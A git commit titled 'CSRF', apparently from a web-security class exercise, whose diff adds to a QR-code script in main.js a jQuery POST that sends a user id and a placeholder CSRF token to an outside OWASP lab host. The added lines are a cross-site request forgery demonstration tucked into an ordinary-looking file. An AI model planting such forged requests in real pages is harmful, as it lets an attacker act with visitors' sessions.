828aabd6d19d8b381af957907bc05746c12f6240
ayrton <ayrtondumas@gmail.com>
2019-03-27 16:13:18 +0100

    CSRF

--- main.js
+++ main.js
@@ -7,3 +7,11 @@ function generateQRCODE( id_cocktail ) {
     new QRCode(document.getElementById("qrcode"), id_cocktail + "," + cocktail_incr)
     $('#modal1').openModal()
 }
+
+
+data = {
+    userid: "680bb2a4778472eee50206c3777ca7c717be799a",
+    csrfToken: "exampleToken"
+}
+$.post("http://owasp01.tic.heia-fr.ch/", data)
+.done(function(){})
